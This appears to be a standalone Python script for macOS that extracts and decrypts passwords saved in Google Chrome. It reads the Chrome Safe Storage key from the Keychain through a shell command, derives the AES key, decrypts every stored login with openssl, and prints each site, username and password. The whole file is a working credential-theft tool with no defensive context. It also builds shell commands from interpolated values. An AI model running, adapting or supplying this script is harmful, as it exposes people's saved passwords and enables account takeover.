import sqlite3, os, binascii, subprocess, base64, sys, hashlib, glob

loginData = glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/Google/Chrome/Profile*/Login Data")
if len(loginData) == 0:
    loginData = glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/Google/Chrome/Default/Login Data") #attempt default profile
safeStorageKey = subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True).replace(b"\n", b"").replace(b"\"", b"")
if safeStorageKey == b"":
    print("ERROR getting Chrome Safe Storage Key")
    sys.exit()

def chromeDecrypt(encrypted_value, iv, key=None): #AES decryption using the PBKDF2 key and 16x ' ' IV, via openSSL (installed on OSX natively)
    hexKey = binascii.hexlify(key)
    hexEncPassword = base64.b64encode(encrypted_value[3:])
    try: #send any error messages to /dev/null to prevent screen bloating up
        decrypted = subprocess.check_output(f"openssl enc -base64 -d -aes-128-cbc -iv '{iv}' -K {hexKey} <<< {hexEncPassword} 2>/dev/null", shell=True)
    except Exception as e:
        decrypted = b"ERROR retrieving password"
    return decrypted

def chromeProcess(safeStorageKey, loginData):
    iv = ''.join(('20',) * 16) #salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
    key = hashlib.pbkdf2_hmac('sha1', safeStorageKey, b'saltysalt', 1003)[:16]
    fd = os.open(loginData, os.O_RDONLY) #open as read only
    database = sqlite3.connect(f'/dev/fd/{fd}')
    os.close(fd)
    sql = 'select username_value, password_value, origin_url from logins'
    decryptedList = []
    with database:
        for user, encryptedPass, url in database.execute(sql):
            if user == "" or (encryptedPass[:3] != b'v10'): #user will be empty if they have selected "never" store password
                continue
            else:
                urlUserPassDecrypted = (url.encode('ascii', 'ignore'), user.encode('ascii', 'ignore'), chromeDecrypt(encryptedPass, iv, key=key).decode('ascii', 'ignore'))
                #urlUserPassDecrypted = (url.encode('ascii', 'ignore'), user.encode('ascii', 'ignore'), chromeDecrypt(encryptedPass, iv, key=key).encode('ascii', 'ignore'))
                decryptedList.append(urlUserPassDecrypted)
    return decryptedList

for profile in loginData:
    for i, x in enumerate(chromeProcess(safeStorageKey, f"{profile}")):
        print(f"\033[32m[{i+1}]\033[0m \033[1m{x[0]}\033[0m\n\t\033[32mUser\033[0m: {x[1]}\n\t\033[32mPass\033[0m: {x[2]}")
